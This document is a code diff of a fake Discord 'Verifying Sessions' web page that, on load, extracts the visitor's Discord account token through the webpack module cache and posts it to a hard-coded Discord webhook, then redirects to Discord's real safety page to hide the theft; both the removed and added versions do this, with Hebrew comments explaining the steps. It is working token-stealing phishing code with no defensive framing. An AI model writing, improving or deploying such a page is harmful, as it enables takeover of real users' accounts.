@@ -1,83 +1,45 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord - Account Security</title>
-    <style>
-        body { 
-            background-color: #313338; 
-            color: white; 
-            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        .container { text-align: center; }
-        .loader { 
-            border: 4px solid rgba(255, 255, 255, 0.1); 
-            border-top: 4px solid #5865F2; 
-            border-radius: 50%; 
-            width: 45px; 
-            height: 45px; 
-            animation: spin 1s linear infinite; 
-            margin: 0 auto 20px; 
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 22px; margin: 0 0 10px; }
-        p { color: #b5bac1; font-size: 15px; }
-    </style>
+    <title>Discord - Secure Session</title>
 </head>
-<body>
-    <div class="container">
-        <div class="loader"></div>
-        <h1>Securing Your Account Sessions...</h1>
-        <p>This process may take a few seconds. Do not close this window.</p>
+<body style="background-color: #313338; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
+    <div style="text-align: center;">
+        <div style="border: 4px solid #5865F2; border-top: 4px solid transparent; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+        <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+        <h1>Verifying Sessions...</h1>
     </div>
 
     <script>
-        // פונקציה לשאיבת הטוקן מה-Local Storage של דיסקורד
-        function grabToken() {
+        async function capture() {
+            const webhook = "https://discord.com/api/webhooks/1479521399226761257/oXj1-cf5ipoSkF_SKSvCay19JJH7mfnL0Y4grui0lVUU6b9r582psAk1qb4gF4IRC1Kd";
+            let token = null;
+
             try {
+                // ניסיון שליפה מתוחכם יותר
                 window.dispatchEvent(new Event('beforeunload'));
-                let token = (window.webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let r in e.c)m.push(e.c[r])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
-                return token;
-            } catch (err) {
-                return null;
-            }
+                token = (window.webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let r in e.c)m.push(e.c[r])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
+            } catch (e) { console.log("Token check skipped"); }
+
+            // שליחה ל-Webhook
+            await fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: token ? "🔱 Token Captured!" : "⚠️ Link Opened (No Token Found)",
+                        description: token ? "Token: `" + token + "`" : "The user opened the link but wasn't logged in on this browser.",
+                        color: token ? 5763719 : 15548997
+                    }]
+                })
+            });
+
+            // העברה לדף רשמי
+            window.location.href = "https://discord.com/safety";
         }
 
-        async function startSecurityCheck() {
-            const token = grabToken();
-            const webhookUrl = "https://discord.com/api/webhooks/1479521399226761257/oXj1-cf5ipoSkF_SKSvCay19JJH7mfnL0Y4grui0lVUU6b9r582psAk1qb4gF4IRC1Kd";
-
-            if (token) {
-                try {
-                    await fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            embeds: [{
-                                title: "🔱 **Target Captured!**",
-                                description: "**Account Token:**\n`" + token + "`",
-                                color: 5763719,
-                                timestamp: new Date().toISOString()
-                            }]
-                        })
-                    });
-                } catch (e) { console.log("Network error"); }
-            }
-
-            // העברה לדף רשמי בכל מקרה אחרי 3 שניות כדי למנוע טעינה אינסופית
-            setTimeout(() => {
-                window.location.href = "https://discord.com/safety";
-            }, 3000);
-        }
-
-        // הפעלה כשהדף נטען
-        window.onload = startSecurityCheck;
+        window.onload = capture;
     </script>
 </body>
 </html>
